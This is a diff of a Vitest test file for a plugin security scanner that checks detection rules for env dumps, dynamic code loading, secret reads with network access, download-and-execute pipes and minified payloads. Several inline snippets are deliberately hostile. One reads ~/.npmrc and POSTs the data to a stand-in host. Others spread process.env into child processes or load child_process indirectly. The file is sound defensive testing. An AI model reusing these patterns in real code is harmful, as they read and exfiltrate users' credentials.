@@ -1,7 +1,8 @@
-import { chmodSync, cpSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
+import { chmodSync, cpSync, readFileSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterAll, describe, expect, it } from "vitest";
+import { KNOWN_VENDORED_SHA256 } from "../src/checks/files.js";
 import { formatReport, runChecks, type CheckResult, type Finding } from "../src/checks/index.js";
 
 const FIXTURES = new URL("./fixtures/", import.meta.url).pathname;
@@ -218,7 +219,6 @@ describe("bypasses: each is a finding, a capability or an explicit 'dynamic acce
   it("a URL import is a block", async () => expect(rules(await fixture("url-import"), "block")).toContain("url-import"));
   it("a file that does not parse is a review, not a pass", async () => {
     expect(await fixture("unparseable")).toMatchObject({ findings: [{ rule: "parse-failed", severity: "review", file: "index.js" }] });
-    expect(rules(await fixture("ts-enum"), "review")).toContain("parse-failed");
   });
   it("a constant folded through variables is still seen", async () => {
     const r = await tree({ "i.js": "const a = 'child_';\nconst b = a + 'process';\nconst cp = require(b);\nexport default cp;\n" });
@@ -233,8 +233,8 @@ describe("hard signs (spec §5.1)", () => {
     expect(rules(await tree({ "i.js": "export const s = JSON.stringify({ ...process.env, a: 1 });\n" }), "block")).toContain("env-dump");
     expect(rules(await tree({ "i.js": "export const s = Object.entries(process.env);\n" }), "block")).toContain("env-dump");
   });
-  it("spreading env into a child's options is not a dump", async () => {
-    expect(rules(await tree({ "i.js": "import { spawn } from 'node:child_process';\nspawn('ls', [], { env: { ...process.env } });\n" }), "block")).toEqual([]);
+  it("spreading env into a child's options is a dump too (review item 2: block, a human may approve)", async () => {
+    expect(rules(await tree({ "i.js": "import { spawn } from 'node:child_process';\nspawn('ls', [], { env: { ...process.env } });\n" }), "block")).toContain("env-dump");
   });
   it("reading ~/.ssh with network is a block; without network a review", async () => {
     expect(rules(await fixture("secret-network"), "block")).toContain("secret-read-network");
@@ -243,7 +243,7 @@ describe("hard signs (spec §5.1)", () => {
     expect(rules(r, "review")).toContain("secret-path");
   });
   it("secret in one file and network in another is still a block", async () => {
-    const r = await tree({ "a.js": "export const p = process.env.HOME + '/.npmrc';\n", "b.js": "export const send = (d) => fetch('https://x.example', { method: 'POST', body: d });\n" });
+    const r = await tree({ "a.js": "import { readFileSync } from 'node:fs';\nexport const p = readFileSync(process.env.HOME + '/.npmrc');\n", "b.js": "export const send = (d) => fetch('https://x.example', { method: 'POST', body: d });\n" });
     expect(rules(r, "block")).toContain("secret-read-network");
   });
   it("download and execute", async () => {
@@ -296,5 +296,162 @@ describe("result shape", () => {
     const before = statSync(join(dir, "server.ts")).mtimeMs;
     await runChecks(dir);
     expect(statSync(join(dir, "server.ts")).mtimeMs).toBe(before);
+  });
+});
+
+describe("review 2.1 — what used to be silent", () => {
+  const capDetail = (r: CheckResult, kind: string) => cap(r, kind)?.detail ?? [];
+  it("process.getBuiltinModule('child_process') is a capability; a computed name is a review", async () => {
+    expect(cap(await fixture("get-builtin-module"), "child_process")).toBeDefined();
+    expect(rules(await fixture("get-builtin-module-dynamic"), "review")).toContain("dynamic-require");
+  });
+  it("module.constructor._load and Module._load are a review and a capability", async () => {
+    for (const name of ["module-load", "module-load-import"]) {
+      const r = await fixture(name);
+      expect(rules(r, "review")).toContain("module-load");
+      expect(cap(r, "child_process")).toBeDefined();
+    }
+    expect(rules(await fixture("module-load"), "review")).toContain("dynamic-constructor");
+  });
+  it("(() => {}).constructor('…')() is a review and dynamic code", async () => {
+    const r = await fixture("arrow-constructor");
+    expect(rules(r, "review")).toContain("dynamic-constructor");
+    expect(cap(r, "dynamic_code")).toBeDefined();
+  });
+  it("this.constructor.name and err.constructor are not flagged", async () => {
+    const r = await tree({ "i.js": "export const n = (o) => o.constructor.name + String(o.constructor === Object);\n" });
+    expect(rules(r)).not.toContain("dynamic-constructor");
+  });
+  it("setTimeout/setInterval with a string execute code", async () => {
+    for (const name of ["settimeout-string", "setinterval-string"]) {
+      const r = await fixture(name);
+      expect(capDetail(r, "dynamic_code").join()).toMatch(/set(Timeout|Interval)\(string\)/);
+    }
+    expect(cap(await tree({ "i.js": "setTimeout(() => 1, 5);\n" }), "dynamic_code")).toBeUndefined();
+  });
+  it("WebAssembly is dynamic code and a review", async () => {
+    const r = await fixture("webassembly");
+    expect(cap(r, "dynamic_code")!.detail).toContain("WebAssembly");
+    expect(rules(r, "review")).toContain("webassembly");
+  });
+  it("node:inspector is dynamic code", async () => expect(capDetail(await fixture("inspector"), "dynamic_code")).toContain("inspector"));
+  it("an unknown node: module is a review, a known harmless one is not", async () => {
+    expect(rules(await fixture("unknown-builtin"), "review")).toContain("unknown-builtin");
+    expect(rules(await tree({ "i.js": "import p from 'node:path';\nimport u from 'node:util';\nexport default [p, u];\n" }))).toEqual([]);
+  });
+  it("cp[name](…) on a module namespace is a review", async () => {
+    const r = await fixture("computed-module-call");
+    expect(rules(r, "review")).toContain("dynamic-access");
+    expect(cap(r, "child_process")).toBeDefined();
+  });
+  it("Reflect.get(globalThis, k) is a review", async () => expect(rules(await fixture("reflect-global"), "review")).toContain("dynamic-access"));
+
+  describe("env-dump, every form (item 2)", () => {
+    it.each(["env-spread", "env-assign", "env-structured-clone", "env-alias-stringify", "env-copy-alias-stringify", "env-rest"])("%s", async (name) => {
+      expect(rules(await fixture(name), "block")).toContain("env-dump");
+    });
+    it("named reads through an alias are not a dump and keep their names", async () => {
+      const r = await fixture("env-named-only");
+      expect(rules(r, "block")).toEqual([]);
+      expect(capDetail(r, "env")).toEqual(["HOME", "SHELL", "USER"]);
+    });
+  });
+
+  describe("parsing TypeScript (item 3, 4)", () => {
+    it("parses enum, namespace, constructor parameter properties and generics — with true line numbers", async () => {
+      const r = await fixture("ts-everything");
+      expect(rules(r)).not.toContain("parse-failed");
+      expect(cap(r, "network")!.sites[0]).toEqual({ file: "index.ts", line: 12 });
+    });
+    it("parses .tsx with imports, enums, generic arrows and JSX; sees the fetch inside JSX", async () => {
+      const r = await fixture("tsx-everything");
+      expect(rules(r)).not.toContain("parse-failed");
+      expect(cap(r, "network")!.sites[0]).toEqual({ file: "view.tsx", line: 6 });
+    });
+    it("an ES module that fails to parse reports the module-mode error, not a 'sourceType' complaint", async () => {
+      const r = await tree({ "v.tsx": "import x from 'y';\nexport const a = ;\n" });
+      const f = r.findings.find((x) => x.rule === "parse-failed")!;
+      expect(f.severity).toBe("review");
+      expect(f.excerpt).not.toMatch(/sourceType/);
+    });
+    it("a .cjs file is a script", async () => expect(cap(await tree({ "a.cjs": "const cp = require('child_process');\nreturn cp;\n" }), "child_process")).toBeDefined());
+  });
+
+  describe("path strings (item 5)", () => {
+    it("bare strings are only info, even with network and a writer in the plugin", async () => {
+      const r = await fixture("bare-strings");
+      expect(rules(r, "block")).toEqual([]);
+      expect(rules(r, "review")).toEqual([]);
+      expect(rules(r, "info")).toEqual(expect.arrayContaining(["secret-path-string"]));
+    });
+    it.each(["secret-join-network", "secret-template-network", "secret-variable-network"])("%s: a secret path that reaches fs/path/os plus network is a block", async (name) => {
+      expect(rules(await fixture(name), "block")).toContain("secret-read-network");
+    });
+    it("a config path that is only read or joined is not a write", async () => {
+      const r = await fixture("rc-read-only");
+      expect(rules(r, "block")).toEqual([]);
+    });
+    it("a shell pipe is a block only where it reaches child_process", async () => {
+      expect(rules(await fixture("bare-strings"), "block")).toEqual([]);
+      expect(rules(await fixture("download-exec-pipe"), "block")).toContain("download-exec");
+    });
+  });
+
+  describe("minified (items 6, 9)", () => {
+    it("the vendored parser files are not called minified, and are not special-cased by path", async () => {
+      for (const f of ["acorn.mjs", "acorn-jsx.mjs", "acorn-typescript.mjs"]) {
+        const r = await tree({ "vendored.mjs": readFileSync(new URL(`../vendor/${f}`, import.meta.url)) });
+        expect(rules(r), f).not.toContain("minified");
+      }
+    });
+    it("the exemption is by hash: the same file with one byte changed is judged on its merits", async () => {
+      const text = readFileSync(new URL("../vendor/acorn.mjs", import.meta.url), "utf8");
+      expect(rules(await tree({ "v.mjs": text + "\n// x\n" }))).not.toContain("minified"); // still readable code: no exemption needed
+      expect(KNOWN_VENDORED_SHA256.size).toBe(3);
+    });
+    it("every built-in hash is the one written in vendor/README.md", () => {
+      const readme = readFileSync(new URL("../vendor/README.md", import.meta.url), "utf8");
+      for (const h of KNOWN_VENDORED_SHA256) expect(readme).toContain(h);
+    });
+    it("a few \\u escapes in a big file do not make it dense", async () => {
+      const body = "export const A = '\\u00e9\\u00e8';\n".repeat(10) + Array.from({ length: 300 }, (_, i) => `export function handler${i}(request) {\n  return request.value + ${i};\n}\n`).join("");
+      expect(rules(await tree({ "i.js": body }))).not.toContain("minified");
+    });
+    it("real dense escapes still are", async () => {
+      const body = "const t = '" + "\\u00e9".repeat(500) + "';\n" + "// pad\n".repeat(20);
+      expect(rules(await tree({ "i.js": body }), "block")).toContain("minified");
+    });
+    it("a long line that is a template-literal script is data, not minified code (inline-vis/frame.ts)", async () => {
+      expect(rules(await fixture("template-script"))).not.toContain("minified");
+    });
+    it("but a minified payload in plain code still is", async () => expect(rules(await fixture("minified"), "block")).toContain("minified"));
+  });
+
+  describe("secure-bb checks itself (item 7)", () => {
+    it("the tree of secure-bb (without test/) has no block finding", async () => {
+      const dir = join(scratch, "self");
+      const repo = new URL("..", import.meta.url).pathname;
+      cpSync(repo, dir, { recursive: true, filter: (p) => !/\/(node_modules|\.git|dist|test|\.claude|chk|\.home)(\/|$)/.test(p.slice(repo.length - 1)) && !/package-lock\.json$/.test(p) });
+      chmodSync(dir, 0o755);
+      normalise(dir);
+      const r = await runChecks(dir);
+      expect(r.findings.filter((f) => f.severity === "block"), formatReport(r)).toEqual([]);
+      expect(r.stats.parsed).toBeGreaterThan(10);
+      expect(rules(r)).not.toContain("parse-failed");
+    });
+  });
+
+  describe("dependencies (item 8) and secrets with network (item 10)", () => {
+    it("workspace: is a review, git+https: is a block", async () => {
+      const r = await fixture("workspace-dep");
+      expect(r.findings.find((f) => f.rule === "workspace-dependency")!.severity).toBe("review");
+      expect(r.findings.find((f) => f.rule === "url-dependency")!.severity).toBe("block");
+    });
+    it("a secret-looking env variable next to dns is a review", async () => {
+      const r = await fixture("dns-secret");
+      expect(cap(r, "network")!.detail).toContain("dns/promises");
+      expect(r.findings.find((f) => f.rule === "env-secret-network")).toMatchObject({ severity: "review", file: "index.js" });
+    });
+    it("a harmless env variable next to dns is not", async () => expect(rules(await fixture("dns-no-secret"))).not.toContain("env-secret-network"));
   });
 });
